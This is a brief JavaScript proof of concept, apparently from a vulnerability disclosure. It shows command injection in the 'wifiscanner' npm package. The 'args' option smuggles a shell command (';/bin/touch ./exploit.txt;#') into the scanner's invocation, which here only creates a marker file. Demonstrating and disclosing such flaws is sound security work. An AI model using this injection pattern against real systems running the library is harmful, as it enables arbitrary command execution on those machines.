(function() {
    let wifiscanner = require("wifiscanner");
    let options = {
        args: ";/bin/touch ./exploit.txt;#"
    }
    let scanner = wifiscanner(options);
    scanner.scan(function(error, networks){});
})();
